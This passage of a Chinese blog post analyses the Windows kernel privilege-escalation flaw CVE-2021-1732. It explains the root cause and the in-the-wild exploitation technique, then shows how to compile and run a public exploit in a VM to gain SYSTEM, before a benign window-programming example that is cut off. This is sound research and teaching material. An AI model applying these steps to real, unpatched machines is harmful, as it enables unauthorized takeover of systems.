<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CVE-2021-1732完全攻略 | in1t's blog</title><meta name="keywords" content="CVE,本地提权"><meta name="author" content="in1t"><meta name="copyright" content="in1t"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="这是去年投给安全客的文章，详细介绍了一个思路绝妙的本地提权漏洞，适合借此入门 Windows 内核">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2021-1732完全攻略">
<meta property="og:url" content="https://in1t.top/2022/01/04/CVE-2021-1732%E5%AE%8C%E5%85%A8%E6%94%BB%E7%95%A5/index.html">
<meta property="og:site_name" content="in1t&#39;s blog">
<meta property="og:description" content="这是去年投给安全客的文章，详细介绍了一个思路绝妙的本地提权漏洞，适合借此入门 Windows 内核">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://in1t.top/img/cover/cve-2021-1732.jpg">
<meta property="article:published_time" content="2022-01-04T04:27:48.000Z">
<meta property="article:modified_time" content="2022-01-04T07:10:50.668Z">
<meta property="article:author" content="in1t">
<meta property="article:tag" content="CVE">
<meta property="article:tag" content="本地提权">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://in1t.top/img/cover/cve-2021-1732.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://in1t.top/2022/01/04/CVE-2021-1732%E5%AE%8C%E5%85%A8%E6%94%BB%E7%95%A5/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CVE-2021-1732完全攻略',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-01-04 15:10:50'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="wizard-scene"><div class="wizard-objects"><div class="wizard-square"></div><div class="wizard-circle"></div><div class="wizard-triangle"></div></div><div class="wizard"><div class="wizard-body"></div><div class="wizard-right-arm"><div class="wizard-right-hand"></div></div><div class="wizard-left-arm"><div class="wizard-left-hand"></div></div><div class="wizard-head"><div class="wizard-beard"></div><div class="wizard-face"><div class="wizard-adds"></div></div><div class="wizard-hat"><div class="wizard-hat-of-the-hat"></div><div class="wizard-four-point-star --first"></div><div class="wizard-four-point-star --second"></div><div class="wizard-four-point-star --third"></div></div></div></div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">44</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/bangumis/"><i class="fa-fw fas fa-play-circle"></i><span> 番剧</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/cover/cve-2021-1732.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">in1t's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/bangumis/"><i class="fa-fw fas fa-play-circle"></i><span> 番剧</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CVE-2021-1732完全攻略</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-01-04T04:27:48.000Z" title="发表于 2022-01-04 12:27:48">2022-01-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-04T07:10:50.668Z" title="更新于 2022-01-04 15:10:50">2022-01-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">14.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>53分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CVE-2021-1732 是蔓灵花（BITTER）APT 组织在某次被披露的攻击行动中使用的 0day 漏洞，该<strong>高危</strong>漏洞可以在本地将普通用户进程的权限提升至最高的 SYSTEM 权限。受到该漏洞影响的 Windows 版本众多<sup>[1]</sup>，原始利用代码经过少量修改后甚至可以在（当时的）最新版 Windows 10 20H2 64 位全补丁环境进行提权。漏洞的利用样本最早在 2020 年 12 月 10 号就被安恒威胁情报中心捕获到<sup>[2]</sup>，在其与 MSRC 的通力合作下，今年 2 月初，MSRC 将漏洞修复。</p>
<p>目前在 github 上公布的可用 EXP 主要有两个版本，分别由 Kernel Killer<sup>[3]</sup> 和 KaLendsi<sup>[4]</sup> 编写，本文将使用<strong>前者</strong>的 EXP 来做分析和调试（Windows 版本为 Windows 10 Version <strong>1809</strong> for x64）。其本人也在看雪论坛发布了 EXP 开发的相关文章<sup>[5]</sup>（与 github 仓库中的 pdf 内容相同），本文会对 EXP 作者文章的技术细节进行补充，并对 EXP 代码进行近乎逐行的分析、注释。</p>
<p>作为第一次接触 Windows 内核漏洞利用的萌新（之前也只有些许 Windows 驱动开发经验），我将假设读者也和我一样初次尝试 Windows 内核漏洞利用复现，我会用最详尽的方式带你从零认知到完全理解 CVE-2021-1732。如果你正打算入门 Windows 内核，那么这篇文章将会给你提供一些静态分析及动态调试的技巧，如果你是这方面的老师傅，也欢迎对我说错的地方批评指正。总之，要是能在某些方面帮到你的话，就再好不过了。</p>
<br>

<h2 id="漏洞综述"><a href="#漏洞综述" class="headerlink" title="漏洞综述"></a>漏洞综述</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>用户态进程 p 在调用 CreateWindowEx 创建带有<strong>扩展内存</strong>的 Windows 窗口时，内核态图形驱动 win32kfull.sys 模块的 xxxCreateWindowEx 函数会通过 nt!KeUserModeCallback 回调机制调用用户态函数 user32!_xxxClientAllocWindowClassExtraBytes，其向内核返回用户态创建的窗口扩展内存。该返回值如何解释，由窗口对应 tagWND 结构体的 dwExtraFlag 字段规定。如果 dwExtraFlag 包含 0x800 属性，则返回值被视作<strong>相对内核桌面堆起始地址的偏移</strong>。攻击者可以 hook user32!_xxxClientAllocWindowClassExtraBytes 函数，通过一些手段使得 dwExtraFlag 包含 0x800 属性，然后直接调用 ntdll!NtCallbackReturn 向内核返回一个任意值。回调结束后，dwExtraFlag 不会被清除，未经校验的返回值直接被用于堆内存寻址（桌面堆起始地址 + 返回值），引发内存越界访问。随后攻击者通过一些巧妙的构造及 API 封装，获得内存越界读写能力，最后复制 system 进程的 Token 到进程 p 完成提权。</p>
<p>总的来说，漏洞是由 win32kfull!xxxCreateWindowEx 函数内一处由用户态回调导致的 flag 位设置与对应偏移设置不同步所导致的。</p>
<br>

<h3 id="漏洞特点-2"><a href="#漏洞特点-2" class="headerlink" title="漏洞特点[2]"></a>漏洞特点<sup>[2]</sup></h3><ul>
<li>攻击目标为最新版 Windows 10 操作系统<ul>
<li>在野样本攻击的是当时最新版 Windows10 1909 64 位操作系统（在野样本的编译时间为 2020 年 5 月）</li>
<li>在野样本适配了从 Windows10 1709 到 Windows10 1909 多个版本，且会只在 Windows10 1709 及以上版本中运行利用代码</li>
<li>原始利用代码经过少量修改后可在（当时的）最新版 Windows10 20H2 64 位全补丁环境进行提权</li>
</ul>
</li>
<li>漏洞质量高，利用手法精湛，稳定性好，动态检测难度大<ul>
<li>在野样本借助漏洞绕过了最新版 Windows 10 系统的内核地址空间布局随机化（KASLR）</li>
<li>本次漏洞不同于以往的 Win32k 漏洞，漏洞类型不是 UAF，整个利用过程不涉及堆喷射和内存重用，Type Isolation 缓解机制对其无效。在野样本在打开 DriverVerifier 验证器的情况下依然可以正常提权，无法通过开启内核池追踪检测到，动态检测难度大</li>
<li>在野样本的任意地址写入采用了漏洞特性结合 SetWindowLong 系列函数的手法，令人眼前一亮</li>
<li>在野样本借助 GetMenuBarInfo 实现任意地址读取，这种手法此前未被公开过，这体现出开发者精湛的利用编写水平</li>
<li>在野样本在构造出任意地址读写原语后，采用 DataOnlyAttack 的方式替换了当前进程的 Token，目前的内核缓解机制无法防御此类攻击</li>
<li>在野样本的漏洞利用成功率几乎为 100%</li>
<li>在野样本在完成利用后，将相关内核结构全部还原，整个过程不会对系统造成蓝屏影响，工作稳定</li>
</ul>
</li>
<li>使用谨慎，隐蔽性好<ul>
<li>在野样本在进行漏洞利用前对特定杀毒软件进行了检测</li>
<li>在野样本对当前操作系统版本进行了判断，低于 Windows 10 1709 版本的系统不会调用漏洞利用函数</li>
<li>在野样本从 2020 年 5 月完成编译，到 2020 年 12 月被发现，中间至少存活了 7 个月，这说明使用者在使用该漏洞时相当谨慎，间接体现出捕获此类隐蔽性样本的难度</li>
</ul>
</li>
</ul>
<br>

<h3 id="受影响的系统版本"><a href="#受影响的系统版本" class="headerlink" title="受影响的系统版本"></a>受影响的系统版本</h3><p>Windows Server, version 20H2 (Server Core Installation)<br>Windows 10 Version 20H2 for ARM64-based Systems<br>Windows 10 Version 20H2 for 32-bit Systems<br>Windows 10 Version 20H2 for x64-based Systems<br>Windows Server, version 2004 (Server Core installation)<br>Windows 10 Version 2004 for x64-based Systems<br>Windows 10 Version 2004 for ARM64-based Systems<br>Windows 10 Version 2004 for 32-bit Systems<br>Windows Server, version 1909 (Server Core installation)<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows Server 2019 (Server Core installation)<br>Windows Server 2019<br>Windows 10 Version 1809 for ARM64-based Systems<br>Windows 10 Version 1809 for x64-based Systems<br>Windows 10 Version 1809 for 32-bit Systems<br>Windows 10 Version 1803 for ARM64-based Systems<br>Windows 10 Version 1803 for x64-based Systems</p>
<br>

<h3 id="漏洞利用效果"><a href="#漏洞利用效果" class="headerlink" title="漏洞利用效果"></a>漏洞利用效果</h3><p>平台：Windows 10 Version 1809 for x64</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/vulnerability_abstract/1.png" alt="1"></p>
<br>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="制作-Win10-1809-虚拟机"><a href="#制作-Win10-1809-虚拟机" class="headerlink" title="制作 Win10 1809 虚拟机"></a>制作 Win10 1809 虚拟机</h3><p>首先自然是需要一个 Win10 操作系统镜像，在 <a target="_blank" rel="noopener" href="https://msdn.itellyou.cn/">MSDN 工具站</a> 上找到这个镜像并下载：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/vulnerability_recurrence/build_win10_1809_vm/1.png" alt="1"></p>
<p>使用 VMware 创建一个新的虚拟机：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/vulnerability_recurrence/build_win10_1809_vm/2.png" alt="2"></p>
<p>注册码不用填，选择一个要安装的版本，并另外注册一个非 admin 用户：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/vulnerability_recurrence/build_win10_1809_vm/3.png" alt="3"></p>
<p>完成配置之前，需要注意，不论你的电脑配置有多好，请将<strong>处理器数和核心数都设置为 1</strong>，以排除多核复杂性对后面动态调试造成影响：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/vulnerability_recurrence/build_win10_1809_vm/4.png" alt="4"></p>
<p>内存的话给个 2G 就行了，内存给得越大，快照的拍摄和还原就会越慢。之后就是等待 Win10 安装完毕。</p>
<br>

<h3 id="编译-exp"><a href="#编译-exp" class="headerlink" title="编译 exp"></a>编译 exp</h3><p>使用 Visual Studio 2019 创建一个新项目，选择 Windows 桌面向导，下一步：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/vulnerability_recurrence/compile_exploit/1.png" alt="1"></p>
<p>取个项目名 ExploitTest：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/vulnerability_recurrence/compile_exploit/2.png" alt="2"></p>
<p>应用程序类型选择<strong>桌面应用程序</strong>，并勾选空项目：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/vulnerability_recurrence/compile_exploit/3.png" alt="3"></p>
<p>从 Kernel Killer 的 Github 仓库<sup>[3]</sup> 获取 CVE-2021-1732_Exploit.cpp，在 VS 侧面的源文件处右击，添加一个<strong>现有项</strong>，选择刚下载的 CVE-2021-1732_Exploit.cpp：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/vulnerability_recurrence/compile_exploit/4.png" alt="4"></p>
<p>这里切换成 Debug x64：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/vulnerability_recurrence/compile_exploit/5.png" alt="5"></p>
<p>双击打开 CVE-2021-1732_Exploit.cpp，然后 项目 -&gt;  ExploitTest 属性，再次确认配置的是 Debug x64：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/vulnerability_recurrence/compile_exploit/6.png" alt="6"></p>
<p>将 C/C++ -&gt; 优化 -&gt; 优化 设置为 <strong>禁用</strong>：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/vulnerability_recurrence/compile_exploit/7.png" alt="7"></p>
<p>将 C/C++ -&gt; 代码生成 -&gt; 运行库 设置为 <strong>多线程调试（MTd）</strong>，将运行库静态链接到可执行文件中，否则在虚拟机中运行时可能会报找不到 dll 的错。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/vulnerability_recurrence/compile_exploit/12.png" alt="7.1"></p>
<p>将 链接器 -&gt; 调试 -&gt; 生成调试信息 设置为 <strong>生成经过优化以共享和发布的调试信息（/DEBUG:FULL）</strong>，这是为了后面用 ida 加载 pdb 时有符号。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/vulnerability_recurrence/compile_exploit/8.png" alt="8"></p>
<p>将 链接器 -&gt; 高级 -&gt; 随机基址 设置为 <strong>否（/DYNAMICBASE:NO）</strong>，固定基址 设置为 <strong>是（/FIXED）</strong>，这是为了动调的时候方便下断点。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/vulnerability_recurrence/compile_exploit/9.png" alt="9"></p>
<p><strong>应用</strong>后选择上方的 生成 -&gt; 生成解决方案，生成好后就能在项目所在的文件夹下看到一个 x64 文件夹：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/vulnerability_recurrence/compile_exploit/10.png" alt="10"></p>
<p>进入其中的 Debug 文件夹，就能看到生成的 exe 和 pdb 了：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/vulnerability_recurrence/compile_exploit/11.png" alt="11"></p>
<br>

<h3 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h3><p>将 ExploitTest.exe 拷贝到虚拟机中，再拷贝一个 64 位的 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">ProcessExplorer</a> 到虚拟机桌面：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/vulnerability_recurrence/right_escalation_recurring/1.png" alt="1"></p>
<p><strong>右键以管理员身份运行</strong> ProcessExplorer，在上方空白处右键 -&gt; Select Columns，勾选上 Integrity Level，这样就能看到进程的权限了：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/vulnerability_recurrence/right_escalation_recurring/2.png" alt="2"></p>
<p><strong>拍摄快照</strong>（这里务必拍摄快照，方便之后回退）后，双击运行 ExploitTest.exe，查看进程权限：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/vulnerability_recurrence/right_escalation_recurring/3.png" alt="3"></p>
<p>在命令行界面按任意键让程序继续执行，再看进程权限，已提升为 system：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/vulnerability_recurrence/right_escalation_recurring/4.png" alt="4"></p>
<p>可能一次不能成功（也有可能直接蓝屏），这个时候恢复一下快照，再重新尝试运行即可。</p>
<br>

<h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><h3 id="Windows-桌面程序编程"><a href="#Windows-桌面程序编程" class="headerlink" title="Windows 桌面程序编程"></a>Windows 桌面程序编程</h3><p>这个部分是为没有进行过/不太熟练 Windows 桌面应用开发的读者而写的，我会用尽可能少的篇幅来让读者快速上手桌面开发 API 以及一些相关的结构体。如果你已经知晓了结构体 WNDCLASSEX 的 cbWndExtra 字段的作用，以及其与 GetWindowLong/SetWindowLong 系列 API 配合的含义，那么你可以选择跳到下个部分去。</p>
<p>和 <strong>2.2 节</strong> 操作相同，使用 Visual Studio 2019 创建一个桌面应用程序的空项目，切换成 Debug x64，在左侧源文件处右击，添加一个新建项，命名为 main.cpp，将下面的代码复制进去：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 窗口类的窗口过程函数(负责消息处理) */</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MyWndProc</span><span class="params">(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in"><span class="keyword">switch</span></span> (message)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> WM_RBUTTONDOWN:	<span class="comment">// #define WM_RBUTTONDOWN 0x0204 - 代表鼠标右键按下</span></span><br><span class="line">			<span class="built_in">MessageBox</span>(hWnd, <span class="string">L&quot;Right Button Down Detected&quot;</span>, <span class="string">L&quot;Message Arrival&quot;</span>, MB_OK); <span class="comment">// 简单弹个对话框</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd, message, wParam, lParam); <span class="comment">// 对其他消息都使用默认方式处理</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 程序入口点 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> APIENTRY <span class="title">wWinMain</span><span class="params">(_In_ HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_opt_ HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ LPWSTR    lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ <span class="keyword">int</span>       nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HWND hwnd;    <span class="comment">// 创建窗口函数 CreateWindowEx 会返回一个窗口句柄，这里定义下，用来接收这个句柄</span></span><br><span class="line">	MSG msg;      <span class="comment">// 消息结构体，在消息循环的时候需要</span></span><br><span class="line">	WNDCLASSEX wndclass = &#123; <span class="number">0</span> &#125;; <span class="comment">// 创建窗口类结构体</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 对窗口类的各属性进行初始化 */</span></span><br><span class="line">	wndclass.cbSize = <span class="built_in"><span class="keyword">sizeof</span></span>(WNDCLASSEX);     <span class="comment">// 字段 cbSize 需要等于结构体 WNDCLASSEX 的大小</span></span><br><span class="line">	wndclass.style = CS_HREDRAW | CS_VREDRAW; <span class="comment">// 窗口类风格 - 窗口水平/竖直方向的长度变化时重绘整个窗口</span></span><br><span class="line">	wndclass.lpfnWndProc = MyWndProc;         <span class="comment">// 窗口消息处理函数 - 这里使用上面声明的 MyWndProc</span></span><br><span class="line">	wndclass.hInstance = hInstance;           <span class="comment">// 该窗口类的窗口消息处理函数所属的应用实例 - 